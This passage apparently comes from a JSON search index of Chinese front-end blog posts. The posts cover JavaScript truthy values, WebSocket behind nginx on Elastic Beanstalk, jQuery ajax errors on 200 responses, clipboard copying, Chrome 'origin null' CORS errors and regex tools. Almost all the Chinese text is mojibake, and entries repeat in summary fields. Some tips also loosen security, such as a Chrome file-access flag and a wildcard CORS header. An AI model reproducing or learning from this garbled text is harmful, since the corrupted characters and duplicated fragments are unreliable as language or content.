ç©ºå¯¹è±¡å’Œç©ºæ•°ç»„ï¼Œå¾ˆå¤šåˆå­¦è€…éƒ½å¾ˆç”¨æŠŠè¿™ä¸¤ä¸ªå½“åšå‡å€¼ã€‚ä½†æ˜¯å®é™…ä¸Šä»–ä»¬æ˜¯çœŸå€¼ï¼Œä½ åªéœ€è¦è®°ä½ï¼Œé™¤äº†nullä¹‹å¤–çš„æ‰€æœ‰å¯¹è±¡ç±»å‹çš„æ•°æ®ï¼Œéƒ½æ˜¯çœŸå€¼ã€‚\ntypeof null // \u0026#39;object\u0026#39; æ®è¯´ï¼štypeof nullè¿”å›å¯¹è±¡è¿™æ˜¯ä¸€ä¸ªjsè¯­è¨€ä¸­çš„bugã€‚å®é™…ä¸Štypeof nullåº”è¯¥è¿”å›nullæ‰æ¯”è¾ƒå‡†ç¡®ï¼Œä½†æ˜¯è¿™ä¸ªbugå·²ç»å­˜æ¥å¥½ä¹…äº†ã€‚å‡ ä¹æ‰€æœ‰çš„ä»£ç é‡Œéƒ½è¿™æ ·å»åˆ¤æ–­ã€‚å¦‚æœæŠŠtypeof nullç»™æ”¹æˆè¿”å›null, é‚£ä¹ˆè¿™å¿…å®šä¼šå¯¼è‡´JSä¸–ç•Œæœ«æ—¥ã€‚\næˆ‘ä»¬æ‰¿è®¤JSå¹¶ä¸å®Œç¾ï¼Œå¥¹æœ‰å¾ˆå¤šå°ç¼ºç‚¹ï¼Œä½†æ˜¯è¿™å¹¶ä¸å¦¨ç¢å¥¹å¸å¼•ä¸‡åƒå¼€å‘è€…æ‹œå€’åœ¨å¥¹çš„çŸ³æ¦´è£™ä¸‹ã€‚\nå°±åƒä¸€é¦–æ­Œå”±çš„ï¼šæœ‰äº›äººè¯´ä¸æ¸…å“ªé‡Œå¥½ ä½†å°±æ˜¯è°éƒ½æ›¿ä»£ä¸äº†","title":"jsä¸­çš„çœŸå€¼å’Œå‡å€¼"},{"content":"1. AWS EC2 ä¸æ”¯æŒWebSocket ç›´è¾¾è§£å†³æ–¹æ¡ˆ è‹±æ–‡ç‰ˆ\nç®€å•è¯´ä¸€ä¸‹æ€è·¯ï¼šWebSocketåº•å±‚åŸºäºTCPåè®®çš„ï¼Œå¦‚æœä½ çš„æœåŠ¡å™¨åŸºäºHTTPåè®®æš´éœ²80ç«¯å£ï¼Œé‚£WebSocketè‚¯å®šæ— æ³•è¿æ¥ã€‚ä½ åªè¦å°†HTTPåè®®ä¿®æ”¹æˆTCPåè®®å°±å¯ä»¥äº†ã€‚\nç„¶åæ˜¯å®‰å…¨ç»„çš„é…ç½®ï¼š\nåŒæ ·å¦‚æœä½¿ç”¨äº†NGINXä½œä¸ºåå‘ä»£ç†ï¼Œé‚£ä¹ˆNGINXä¹Ÿéœ€è¦åšé…ç½®çš„ã€‚\n// https://gist.githubusercontent.com/unshift/324be6a8dc9e880d4d670de0dc97a8ce/raw/29507ed6b3c9394ecd7842f9d3228827cffd1c58/elasticbeanstalk_websockets files: \u0026#34;/etc/nginx/conf.d/01_websockets.conf\u0026#34; : mode: \u0026#34;000644\u0026#34; owner: root group: root content : | upstream nodejs { server 127.0.0.1:8081; keepalive 256; } server { listen 8080; location / { proxy_pass http://nodejs; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \u0026#34;upgrade\u0026#34;; proxy_http_version 1.1; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } } \u0026#34;/opt/elasticbeanstalk/hooks/appdeploy/enact/41_remove_eb_nginx_confg.sh\u0026#34;: mode: \u0026#34;000755\u0026#34; owner: root group: root content : | mv /etc/nginx/conf.d/00_elastic_beanstalk_proxy.conf /etc/nginx/conf.d/00_elastic_beanstalk_proxy.conf.old 2. NGINXåšåå‘ä»£ç†æ˜¯éœ€è¦æ³¨æ„çš„é—®é¢˜ å¦‚æœæ’é™¤æ‰€æœ‰é—®é¢˜åï¼Œé‚£å‰©ä¸‹çš„é—®é¢˜å¯ä»¥è€ƒè™‘å‡ºåœ¨åå‘ä»£ç†ä¸Šï¼Œä¸€ä¸‹æœ‰å‡ ç‚¹æ˜¯å¯ä»¥è€ƒè™‘çš„ã€‚\nHTTPçš„ç‰ˆæœ¬é—®é¢˜: httpæœ‰ä¸‰ä¸ªç‰ˆæœ¬ï¼Œhttp 1.0, 1.1, 2.0, ç°åœ¨ä¸»æµçš„æµè§ˆå™¨éƒ½æ˜¯ä½¿ç”¨http 1.1ç‰ˆæœ¬ï¼Œä¸ºäº†ä¿è¯æ›´å¥½çš„å…¼å®¹æ€§ï¼Œæœ€å¥½è½¬å‘æ—¶ä¸è¦ä¿®æ”¹åè®®çš„ç‰ˆæœ¬å·\nNGINXå…·æœ‰è·¯å¾„é‡å†™åŠŸèƒ½ï¼Œå¦‚æœä½ ä½¿ç”¨äº†è¯¥åŠŸèƒ½ï¼Œå°±è¦è€ƒè™‘é—®é¢˜å¯èƒ½å‡ºåœ¨è¿™é‡Œï¼Œå› ä¸ºNGINXåœ¨è·¯å¾„é‡å†™æ—¶ï¼Œéœ€è¦å¯¹è·¯å¾„è¿›è¡Œç¼–è§£ç ï¼Œæœ‰å¯èƒ½åœ¨è§£ç ä¹‹åï¼Œæ²¡æœ‰ç¼–ç å°±å‘é€ç»™åç«¯çš„æœåŠ¡å™¨ï¼Œå¯¼è‡´åç«¯æœåŠ¡å™¨æ— æ³•å¯¹URLè¿›è¡Œè§£ç ã€‚\n3. IE8 IE9 æœ‰æ²¡æœ‰ç®€å•æ–¹ä¾¿æ”¯æŒWebSocketçš„æ–¹æ¡ˆ ç›®å‰æµ‹è¯•ä¸‹æ¥ï¼Œæœ€ç®€å•æ–¹æ¡ˆæ˜¯åŸºäºflashçš„ã€‚å‚è€ƒï¼šhttps://github.com/gimite/web-socket-js,\næ³¨æ„è¯¥æ–¹æ¡ˆéœ€è¦åœ¨WebSocketæœåŠ¡ä¸Šçš„843ç«¯å£, æä¾›socket_policy_files, ä¹Ÿå¯ä»¥å‚è€ƒï¼šA PolyFill for WebSockets\nç½‘ä¸Šä¹Ÿæœ‰æ•™ç¨‹æ˜¯ä½¿ç”¨socket.ioåŸºäºajaxé•¿è½®è®­çš„æ–¹æ¡ˆï¼Œå¦‚æœæœåŠ¡ç«¯å·²ç»ç¡®å®šçš„æƒ…å†µä¸‹ï¼Œä¸€èˆ¬æ˜¯ä¸ä¼šè½»æ˜“æ”¹åŠ¨æœåŠ¡ç«¯ä»£ç çš„ã€‚è€Œä¸”ajaxé•¿è½®è®­ä¹Ÿæ˜¯æœ‰å»¶è¿Ÿï¼Œå’Œdisconnectæ—¶ï¼Œæ— æ³•å›è°ƒçš„é—®é¢˜ã€‚\n4. stompjs connectedåï¼Œæ²¡æœ‰è°ƒç”¨connect_callBack è¯¥é—®é¢˜ä¸»è¦æ˜¯ä½¿ç”¨web-socket-jsï¼Œåœ¨ie8,ie9ä¸Šå‡ºç°çš„\nè¯¥é—®é¢˜è¿˜æ²¡æœ‰åˆ†æå‡ºåŸå› ï¼Œä½†æ˜¯çœ‹äº†stompjsçš„æºç ä¸æ˜¯å¤ªå¤šï¼Œæ˜å¤©ç”¨æºç è°ƒè¯•çœ‹çœ‹åŸå› ã€‚\né—®é¢˜å·²ç»æ‰¾åˆ°ï¼Œè¯·å‚è€ƒï¼šhttps://github.com/wangduanduan/stomp-websocket#about-ie8-ie9-use-websocket\n5. å‚è€ƒæ–‡çŒ® STOMP Over WebSocket STOMP Protocol Specification, Version 1.1 Stomp Over Websocketæ–‡æ¡£, ","permalink":"https://wdd.js.org/posts/2018/03/stomp-over-websocket/","summary":"1. AWS EC2 ä¸æ”¯æŒWebSocket ç›´è¾¾è§£å†³æ–¹æ¡ˆ è‹±æ–‡ç‰ˆ\nç®€å•è¯´ä¸€ä¸‹æ€è·¯ï¼šWebSocketåº•å±‚åŸºäºTCPåè®®çš„ï¼Œå¦‚æœä½ çš„æœåŠ¡å™¨åŸºäºHTTPåè®®æš´éœ²80ç«¯å£ï¼Œé‚£WebSocketè‚¯å®šæ— æ³•è¿æ¥ã€‚ä½ åªè¦å°†HTTPåè®®ä¿®æ”¹æˆTCPåè®®å°±å¯ä»¥äº†ã€‚\nç„¶åæ˜¯å®‰å…¨ç»„çš„é…ç½®ï¼š\nåŒæ ·å¦‚æœä½¿ç”¨äº†NGINXä½œä¸ºåå‘ä»£ç†ï¼Œé‚£ä¹ˆNGINXä¹Ÿéœ€è¦åšé…ç½®çš„ã€‚\n// https://gist.githubusercontent.com/unshift/324be6a8dc9e880d4d670de0dc97a8ce/raw/29507ed6b3c9394ecd7842f9d3228827cffd1c58/elasticbeanstalk_websockets files: \u0026#34;/etc/nginx/conf.d/01_websockets.conf\u0026#34; : mode: \u0026#34;000644\u0026#34; owner: root group: root content : | upstream nodejs { server 127.0.0.1:8081; keepalive 256; } server { listen 8080; location / { proxy_pass http://nodejs; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \u0026#34;upgrade\u0026#34;; proxy_http_version 1.1; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } } \u0026#34;/opt/elasticbeanstalk/hooks/appdeploy/enact/41_remove_eb_nginx_confg.sh\u0026#34;: mode: \u0026#34;000755\u0026#34; owner: root group: root content : | mv /etc/nginx/conf.","title":"åœ¨å®è·µä¸­æˆ‘é‡åˆ°stompjs, websocketå’Œnginxçš„é—®é¢˜ä¸æ€»ç»“"},{"content":"1. é—®é¢˜ç°è±¡ HTTP çŠ¶æ€ç ä¸º 200 OK æ—¶ï¼Œ jquery ajaxæŠ¥é”™\n2. é—®é¢˜åŸå›  jquery ajaxçš„dataTypeå­—æ®µåŒ…å«ï¼šjson, ä½†æ˜¯æœåŠ¡ç«¯è¿”å›çš„æ•°æ®ä¸æ˜¯è§„èŒƒçš„jsonæ ¼å¼ï¼Œå¯¼è‡´jqueryè§£æjsonå­—ç¬¦ä¸²æŠ¥é”™ï¼Œæœ€ç»ˆå¯¼è‡´ajaxæŠ¥é”™ã€‚\njQuery ajax å®˜æ–¹æ–‡æ¡£ä¸Šè¯´æ˜ï¼š\n\u0026ldquo;json\u0026rdquo;: Evaluates the response as JSON and returns a JavaScript object. Cross-domain \u0026ldquo;json\u0026rdquo; requests are converted to \u0026ldquo;jsonp\u0026rdquo; unless the request includes jsonp: false in its request options. The JSON data is parsed in a strict manner; any malformed JSON is rejected and a parse error is thrown. As of jQuery 1.9, an empty response is also rejected; the server should return a response of null or {} instead. (See json.org for more information on proper JSON formatting.)\nè®¾ç½®dataTypeä¸ºjsonæ—¶ï¼Œjqueryå°±ä¼šå»è§£æå“åº”ä½“ä¸ºJavaScriptå¯¹è±¡ã€‚è·¨åŸŸçš„jsonè¯·æ±‚ä¼šè¢«è½¬åŒ–æˆjsonp, é™¤éè®¾ç½®äº†jsonp: falseã€‚JSONæ•°æ®ä¼šä»¥ä¸¥æ ¼æ¨¡å¼å»è§£æï¼Œä»»ä½•ä¸è§„èŒƒçš„JSONå­—ç¬¦ä¸²éƒ½ä¼šè§£æå¼‚å¸¸å¹¶æŠ›å‡ºé”™è¯¯ã€‚ä»jQuery 1.9èµ·ï¼Œä¸€ä¸ªç©ºçš„å“åº”ä¹Ÿä¼šè¢«æŠ›å‡ºå¼‚å¸¸ã€‚æœåŠ¡ç«¯åº”è¯¥è¿”å›ä¸€ä¸ªnullæˆ–è€…{}å»ä»£æ›¿ç©ºå“åº”ã€‚å‚è€ƒjson.org, æŸ¥çœ‹æ›´å¤šå†…å®¹\n3. è§£å†³æ–¹æ¡ˆ è¿™ä¸ªé—®é¢˜çš„åŸå› æ˜¯åç«¯è¿”å›çš„æ•°æ®æ ¼å¼ä¸è§„èŒƒï¼Œæ‰€ä»¥åç«¯åœ¨è¿”å›ç»“æœæ˜¯ï¼Œä¸è¦ä½¿ç”¨ç©ºçš„å“åº”ï¼Œä¹Ÿä¸åº”è¯¥å»æ‰‹åŠ¨æ‹¼æ¥JSONå­—ç¬¦ä¸²ï¼Œè€Œåº”è¯¥äº¤ç»™å“åº”çš„åº“æ¥å®ç°JSONåºåˆ—åŒ–å­—ç¬¦ä¸²å·¥ä½œã€‚\næ–¹æ¡ˆ1ï¼š å¦‚æœåç«¯ç¡®å®šå“åº”ä½“ä¸­ä¸è¿”å›æ•°æ®ï¼Œé‚£ä¹ˆå°±æŠŠçŠ¶æ€ç è®¾ç½®ä¸º204ï¼Œè€Œä¸æ˜¯200ã€‚æˆ‘ä¸€ç›´é€¼ç€åç«¯åŒäº‹è¿™ä¹ˆåšã€‚ æ–¹æ¡ˆ2ï¼šå¦‚æœåç«¯æ¥å£æƒ³è¿”å›200ï¼Œé‚£ä¹ˆè¯·è¿”å›ä¸€ä¸ªnullæˆ–è€…{}å»ä»£æ›¿ç©ºå“åº” æ–¹æ¡ˆ3ï¼šåˆ«ç”¨jQueryçš„ajaxï¼Œæ¢ä¸ªå…¶ä»–çš„åº“è¯•è¯• 4. å‚è€ƒ Ajax request returns 200 OK, but an error event is fired instead of success jQuery.ajax ","permalink":"https://wdd.js.org/posts/2018/03/status-code-200-jquery-ajax-failed/","summary":"1. é—®é¢˜ç°è±¡ HTTP çŠ¶æ€ç ä¸º 200 OK æ—¶ï¼Œ jquery ajaxæŠ¥é”™\n2. é—®é¢˜åŸå›  jquery ajaxçš„dataTypeå­—æ®µåŒ…å«ï¼šjson, ä½†æ˜¯æœåŠ¡ç«¯è¿”å›çš„æ•°æ®ä¸æ˜¯è§„èŒƒçš„jsonæ ¼å¼ï¼Œå¯¼è‡´jqueryè§£æjsonå­—ç¬¦ä¸²æŠ¥é”™ï¼Œæœ€ç»ˆå¯¼è‡´ajaxæŠ¥é”™ã€‚\njQuery ajax å®˜æ–¹æ–‡æ¡£ä¸Šè¯´æ˜ï¼š\n\u0026ldquo;json\u0026rdquo;: Evaluates the response as JSON and returns a JavaScript object. Cross-domain \u0026ldquo;json\u0026rdquo; requests are converted to \u0026ldquo;jsonp\u0026rdquo; unless the request includes jsonp: false in its request options. The JSON data is parsed in a strict manner; any malformed JSON is rejected and a parse error is thrown. As of jQuery 1.9, an empty response is also rejected; the server should return a response of null or {} instead.","title":"çŠ¶æ€ç ä¸º200æ—¶ jQuery ajaxæŠ¥é”™"},{"content":"1. å…¼å®¹æƒ…å†µ å¦‚æœæƒ³æµè§ˆå™¨æ”¯æŒç²˜è´´åŠŸèƒ½ï¼Œé‚£ä¹ˆæµè§ˆå™¨å¿…é¡»æ”¯æŒï¼Œdocument.execCommand(\u0026lsquo;copy\u0026rsquo;)æ–¹æ³•ï¼Œä¹Ÿå¯ä»¥æ ¹æ®document.queryCommandEnabled(\u0026lsquo;copy\u0026rsquo;)ï¼Œè¿”å›çš„trueæˆ–è€…falseåˆ¤æ–­æµè§ˆå™¨æ˜¯å¦æ”¯æŒcopyå‘½ä»¤ã€‚\nä»ä¸‹è¡¨å¯ä»¥çœ‹å‡ºï¼Œä¸»æµçš„æµè§ˆå™¨éƒ½æ”¯æŒexecCommandå‘½ä»¤\n2. å¤åˆ¶çš„åŸç† æŸ¥è¯¢å…ƒç´  é€‰ä¸­å…ƒç´  æ‰§è¡Œå¤åˆ¶å‘½ä»¤ 3. ä»£ç å±•ç¤º // html \u0026lt;input id=\u0026#34;username\u0026#34; value=\u0026#34;123456\u0026#34;\u0026gt; // æŸ¥è¯¢å…ƒç´  var username = document.getElementById(â€˜usernameâ€™) // é€‰ä¸­å…ƒç´  username.select() // æ‰§è¡Œå¤åˆ¶ document.execCommand(\u0026#39;copy\u0026#39;) æ³¨æ„: ä»¥ä¸Šä»£ç åªæ˜¯ç®€å•ç¤ºæ„ï¼Œåœ¨å®è·µè¿‡ç¨‹ä¸­è¿˜æœ‰å‡ ä¸ªè¦åˆ¤æ–­çš„æƒ…å†µ\né¦–è¦è¦å»æ£€æµ‹æµè§ˆå™¨execCommandèƒ½åŠ›æ£€æµ‹ é€‰å–å…ƒç´ æ—¶ï¼Œæœ‰å¯èƒ½é€‰å–å…ƒç´ ä¸ºç©ºï¼Œè¦è€ƒè™‘è¿™ç§æƒ…å†µçš„å¤„ç† 4. ç¬¬ä¸‰æ–¹æ–¹æ¡ˆ clipboard.jsæ˜¯ä¸€ä¸ªæ¯”è¾ƒæ–¹ä¾¿çš„å‰ªè´´æ¿åº“ï¼ŒåŠŸèƒ½è›®å¤šçš„ã€‚\n\u0026lt;!-- Target --\u0026gt; \u0026lt;textarea id=\u0026#34;bar\u0026#34;\u0026gt;Mussum ipsum cacilds...\u0026lt;/textarea\u0026gt; \u0026lt;!-- Trigger --\u0026gt; \u0026lt;button class=\u0026#34;btn\u0026#34; data-clipboard-action=\u0026#34;cut\u0026#34; data-clipboard-target=\u0026#34;#bar\u0026#34;\u0026gt; Cut to clipboard \u0026lt;/button\u0026gt; å®˜æ–¹ç»™çš„ä»£ç é‡Œæœ‰ä¸Šé¢çš„ä¸€ä¸ªç¤ºä¾‹ï¼Œå¦‚æœä½ ç”¨äº†è¿™ä¸ªç¤ºä¾‹ï¼Œä½†æ˜¯ä¸èµ·ä½œç”¨ï¼Œé‚£ä½ ä¼°è®¡æ˜¯æ²¡æœ‰åˆå§‹åŒ–ClipboardJSç¤ºä¾‹çš„ã€‚\næ³¨æ„ï¼šä¸‹é¢çš„å‡½æ•°å¿…é¡»è¦ä¸»åŠ¨è°ƒç”¨ï¼Œè¿™æ ·æ‰èƒ½ç»™å“åº”çš„DOMå…ƒç´ æ³¨å†Œäº‹ä»¶ã€‚ ClipboardJSæºä»£ç å‹ç¼©åå¤§çº¦æœ‰3kbï¼Œè™½ç„¶å¾ˆå°äº†ï¼Œä½†æ˜¯å¦‚æœä½ ä¸éœ€è¦å®ƒçš„è¿™ä¹ˆå¤šåŠŸèƒ½çš„è¯ï¼Œå…¶å®ä½ è‡ªå·±å†™å‡ è¡Œä»£ç å°±å¯ä»¥æå®šå¤åˆ¶åŠŸèƒ½ã€‚\nnew ClipboardJS(\u0026#39;.btn\u0026#39;); ","permalink":"https://wdd.js.org/posts/2018/03/clipboard-copy-tutorial/","summary":"1. å…¼å®¹æƒ…å†µ å¦‚æœæƒ³æµè§ˆå™¨æ”¯æŒç²˜è´´åŠŸèƒ½ï¼Œé‚£ä¹ˆæµè§ˆå™¨å¿…é¡»æ”¯æŒï¼Œdocument.execCommand(\u0026lsquo;copy\u0026rsquo;)æ–¹æ³•ï¼Œä¹Ÿå¯ä»¥æ ¹æ®document.queryCommandEnabled(\u0026lsquo;copy\u0026rsquo;)ï¼Œè¿”å›çš„trueæˆ–è€…falseåˆ¤æ–­æµè§ˆå™¨æ˜¯å¦æ”¯æŒcopyå‘½ä»¤ã€‚\nä»ä¸‹è¡¨å¯ä»¥çœ‹å‡ºï¼Œä¸»æµçš„æµè§ˆå™¨éƒ½æ”¯æŒexecCommandå‘½ä»¤\n2. å¤åˆ¶çš„åŸç† æŸ¥è¯¢å…ƒç´  é€‰ä¸­å…ƒç´  æ‰§è¡Œå¤åˆ¶å‘½ä»¤ 3. ä»£ç å±•ç¤º // html \u0026lt;input id=\u0026#34;username\u0026#34; value=\u0026#34;123456\u0026#34;\u0026gt; // æŸ¥è¯¢å…ƒç´  var username = document.getElementById(â€˜usernameâ€™) // é€‰ä¸­å…ƒç´  username.select() // æ‰§è¡Œå¤åˆ¶ document.execCommand(\u0026#39;copy\u0026#39;) æ³¨æ„: ä»¥ä¸Šä»£ç åªæ˜¯ç®€å•ç¤ºæ„ï¼Œåœ¨å®è·µè¿‡ç¨‹ä¸­è¿˜æœ‰å‡ ä¸ªè¦åˆ¤æ–­çš„æƒ…å†µ\né¦–è¦è¦å»æ£€æµ‹æµè§ˆå™¨execCommandèƒ½åŠ›æ£€æµ‹ é€‰å–å…ƒç´ æ—¶ï¼Œæœ‰å¯èƒ½é€‰å–å…ƒç´ ä¸ºç©ºï¼Œè¦è€ƒè™‘è¿™ç§æƒ…å†µçš„å¤„ç† 4. ç¬¬ä¸‰æ–¹æ–¹æ¡ˆ clipboard.jsæ˜¯ä¸€ä¸ªæ¯”è¾ƒæ–¹ä¾¿çš„å‰ªè´´æ¿åº“ï¼ŒåŠŸèƒ½è›®å¤šçš„ã€‚\n\u0026lt;!-- Target --\u0026gt; \u0026lt;textarea id=\u0026#34;bar\u0026#34;\u0026gt;Mussum ipsum cacilds...\u0026lt;/textarea\u0026gt; \u0026lt;!-- Trigger --\u0026gt; \u0026lt;button class=\u0026#34;btn\u0026#34; data-clipboard-action=\u0026#34;cut\u0026#34; data-clipboard-target=\u0026#34;#bar\u0026#34;\u0026gt; Cut to clipboard \u0026lt;/button\u0026gt; å®˜æ–¹ç»™çš„ä»£ç é‡Œæœ‰ä¸Šé¢çš„ä¸€ä¸ªç¤ºä¾‹ï¼Œå¦‚æœä½ ç”¨äº†è¿™ä¸ªç¤ºä¾‹ï¼Œä½†æ˜¯ä¸èµ·ä½œç”¨ï¼Œé‚£ä½ ä¼°è®¡æ˜¯æ²¡æœ‰åˆå§‹åŒ–ClipboardJSç¤ºä¾‹çš„ã€‚\næ³¨æ„ï¼šä¸‹é¢çš„å‡½æ•°å¿…é¡»è¦ä¸»åŠ¨è°ƒç”¨ï¼Œè¿™æ ·æ‰èƒ½ç»™å“åº”çš„DOMå…ƒç´ æ³¨å†Œäº‹ä»¶ã€‚ ClipboardJSæºä»£ç å‹ç¼©åå¤§çº¦æœ‰3kbï¼Œè™½ç„¶å¾ˆå°äº†ï¼Œä½†æ˜¯å¦‚æœä½ ä¸éœ€è¦å®ƒçš„è¿™ä¹ˆå¤šåŠŸèƒ½çš„è¯ï¼Œå…¶å®ä½ è‡ªå·±å†™å‡ è¡Œä»£ç å°±å¯ä»¥æå®šå¤åˆ¶åŠŸèƒ½ã€‚\nnew ClipboardJS(\u0026#39;.btn\u0026#39;); ","title":"å‰ç«¯å‰ªè´´æ¿å¤åˆ¶åŠŸèƒ½å®ç°åŸç†"},{"content":"1. é—®é¢˜è¡¨ç° ä»¥file:///xxx.htmlæ‰“å¼€æŸä¸ªhtmlæ–‡ä»¶ï¼Œå‘é€ajaxè¯·æ±‚æ—¶æŠ¥é”™ï¼š\nResponse to preflight request doesn\u0026#39;t pass access control check: The \u0026#39;Access-Control-Allow-Origin\u0026#39; header has a value \u0026#39;null\u0026#39; that is not equal to the supplied origin. Origin \u0026#39;null\u0026#39; is therefore not allowed access. 2. é—®é¢˜åŸå›  Origin nullæ˜¯æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œå› æ­¤è¿™è¡¨æ˜æ‚¨æ­£åœ¨åŠ è½½é€šè¿‡fileï¼š// URLè¿›è¡ŒåŠ è½½è°ƒç”¨çš„HTMLé¡µé¢ï¼ˆä¾‹å¦‚ï¼Œåªéœ€åœ¨æœ¬åœ°æ–‡ä»¶æµè§ˆå™¨æˆ–ç±»ä¼¼æ–‡ä»¶ä¸­åŒå‡»å®ƒï¼‰ã€‚ä¸åŒçš„æµè§ˆå™¨é‡‡ç”¨ä¸åŒçš„æ–¹æ³•å°†ç›¸åŒæ¥æºç­–ç•¥åº”ç”¨åˆ°æœ¬åœ°æ–‡ä»¶ã€‚Chromeè¦æ±‚æ¯”è¾ƒä¸¥æ ¼ï¼Œä¸å…è®¸è¿™ç§å½¢åŠ¿çš„è·¨åŸŸè¯·æ±‚ã€‚è€Œæœ€å¥½ä½¿ç”¨http:// è®¿é—®html.\n3. è§£å†³æ–¹æ¡ˆ ä»¥ä¸‹ç»™å‡ºä¸‰ä¸ªè§£å†³æ–¹æ¡ˆï¼Œç¬¬ä¸€ä¸ªæœ€å¿«ï¼Œç¬¬ä¸‰ä¸ªä½œä¸ºå½»åº•ã€‚\n3.1. æ–¹æ¡ˆ1 ç»™Chromeå¿«æ·æ–¹å¼ä¸­å¢åŠ  \u0026ndash;allow-file-access-from-files æ‰“å¼€Chromeå¿«æ·æ–¹å¼çš„å±æ€§ä¸­è®¾ç½®ï¼šå³å‡»Chromeæµè§ˆå™¨å¿«æ·æ–¹å¼ï¼Œé€‰æ‹©â€œå±æ€§â€ï¼Œåœ¨â€œç›®æ ‡â€ä¸­åŠ \u0026quot;\u0026ndash;allow-file-access-from-files\u0026quot;ï¼Œæ³¨æ„å‰é¢æœ‰ä¸ªç©ºæ ¼ï¼Œé‡å¯Chromeæµè§ˆå™¨ä¾¿å¯ã€‚\n3.2. æ–¹æ¡ˆ2 å¯åŠ¨ä¸€ä¸ªç®€å•çš„é™æ€æ–‡ä»¶æœåŠ¡å™¨, ä»¥httpåè®®è®¿é—®html å‚è§æˆ‘çš„è¿™ç¯‡æ–‡ç« : ä¸€è¡Œå‘½ä»¤æ­å»ºç®€æ˜“é™æ€æ–‡ä»¶httpæœåŠ¡å™¨\n3.3. æ–¹æ¡ˆ3 æœåŠ¡ç«¯å“åº”ä¿®æ”¹Access-Control-Allow-Origin : * response.addHeader(\u0026#34;Access-Control-Allow-Origin\u0026#34;,\u0026#34;*\u0026#34;) 4. å‚è€ƒæ–‡ç«  å¦‚ä½•è§£å†³XMLHttpRequest cannot load file~~~~~~~Origin \u0026rsquo;null\u0026rsquo; is therefore not allowed access è®©chromeæ”¯æŒæœ¬åœ°Ajaxè¯·æ±‚,Ajaxè¯·æ±‚status cancel Origin null is not allowed by Access-Control-Allow-Origin Origin null is not allowed by Access-Control-Allow-Origin ","permalink":"https://wdd.js.org/posts/2018/03/origin-null-is-not-allowed/","summary":"1. é—®é¢˜è¡¨ç° ä»¥file:///xxx.htmlæ‰“å¼€æŸä¸ªhtmlæ–‡ä»¶ï¼Œå‘é€ajaxè¯·æ±‚æ—¶æŠ¥é”™ï¼š\nResponse to preflight request doesn\u0026#39;t pass access control check: The \u0026#39;Access-Control-Allow-Origin\u0026#39; header has a value \u0026#39;null\u0026#39; that is not equal to the supplied origin. Origin \u0026#39;null\u0026#39; is therefore not allowed access. 2. é—®é¢˜åŸå›  Origin nullæ˜¯æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œå› æ­¤è¿™è¡¨æ˜æ‚¨æ­£åœ¨åŠ è½½é€šè¿‡fileï¼š// URLè¿›è¡ŒåŠ è½½è°ƒç”¨çš„HTMLé¡µé¢ï¼ˆä¾‹å¦‚ï¼Œåªéœ€åœ¨æœ¬åœ°æ–‡ä»¶æµè§ˆå™¨æˆ–ç±»ä¼¼æ–‡ä»¶ä¸­åŒå‡»å®ƒï¼‰ã€‚ä¸åŒçš„æµè§ˆå™¨é‡‡ç”¨ä¸åŒçš„æ–¹æ³•å°†ç›¸åŒæ¥æºç­–ç•¥åº”ç”¨åˆ°æœ¬åœ°æ–‡ä»¶ã€‚Chromeè¦æ±‚æ¯”è¾ƒä¸¥æ ¼ï¼Œä¸å…è®¸è¿™ç§å½¢åŠ¿çš„è·¨åŸŸè¯·æ±‚ã€‚è€Œæœ€å¥½ä½¿ç”¨http:// è®¿é—®html.\n3. è§£å†³æ–¹æ¡ˆ ä»¥ä¸‹ç»™å‡ºä¸‰ä¸ªè§£å†³æ–¹æ¡ˆï¼Œç¬¬ä¸€ä¸ªæœ€å¿«ï¼Œç¬¬ä¸‰ä¸ªä½œä¸ºå½»åº•ã€‚\n3.1. æ–¹æ¡ˆ1 ç»™Chromeå¿«æ·æ–¹å¼ä¸­å¢åŠ  \u0026ndash;allow-file-access-from-files æ‰“å¼€Chromeå¿«æ·æ–¹å¼çš„å±æ€§ä¸­è®¾ç½®ï¼šå³å‡»Chromeæµè§ˆå™¨å¿«æ·æ–¹å¼ï¼Œé€‰æ‹©â€œå±æ€§â€ï¼Œåœ¨â€œç›®æ ‡â€ä¸­åŠ \u0026quot;\u0026ndash;allow-file-access-from-files\u0026quot;ï¼Œæ³¨æ„å‰é¢æœ‰ä¸ªç©ºæ ¼ï¼Œé‡å¯Chromeæµè§ˆå™¨ä¾¿å¯ã€‚\n3.2. æ–¹æ¡ˆ2 å¯åŠ¨ä¸€ä¸ªç®€å•çš„é™æ€æ–‡ä»¶æœåŠ¡å™¨, ä»¥httpåè®®è®¿é—®html å‚è§æˆ‘çš„è¿™ç¯‡æ–‡ç« : ä¸€è¡Œå‘½ä»¤æ­å»ºç®€æ˜“é™æ€æ–‡ä»¶httpæœåŠ¡å™¨\n3.3. æ–¹æ¡ˆ3 æœåŠ¡ç«¯å“åº”ä¿®æ”¹Access-Control-Allow-Origin : * response.addHeader(\u0026#34;Access-Control-Allow-Origin\u0026#34;,\u0026#34;*\u0026#34;) 4. å‚è€ƒæ–‡ç«  å¦‚ä½•è§£å†³XMLHttpRequest cannot load file~~~~~~~Origin \u0026rsquo;null\u0026rsquo; is therefore not allowed access è®©chromeæ”¯æŒæœ¬åœ°Ajaxè¯·æ±‚,Ajaxè¯·æ±‚status cancel Origin null is not allowed by Access-Control-Allow-Origin Origin null is not allowed by Access-Control-Allow-Origin ","title":"Chromeæœ¬åœ°è·¨åŸŸorigin-null-is-not-allowedé—®é¢˜åˆ†æä¸è§£å†³æ–¹æ¡ˆ"},{"content":"1. åŠŸèƒ½æœ€å¼ºï¼šregex101 ä¼˜ç‚¹ï¼š\næ”¯æŒå¤šç§è¯­è¨€, prec,php,javascript,python,golang ç•Œé¢ç¾è§‚å¤§æ–¹ æ”¯æŒé”™è¯¯æç¤ºï¼Œå®æ—¶åŒ¹é… ç¼ºç‚¹ï¼š\næœ‰æ—¶å€™åŠ è½½é€Ÿåº¦å¤ªæ…¢ 2. å¯è§†åŒ–æ­£åˆ™ç»˜å›¾: Regulex ä¼˜ç‚¹ï¼š\nå®æ—¶æ ¹æ®æ­£åˆ™è¡¨è¾¾å¼ç»˜å›¾ é¡µé¢åŠ è½½é€Ÿåº¦å¿« 3. 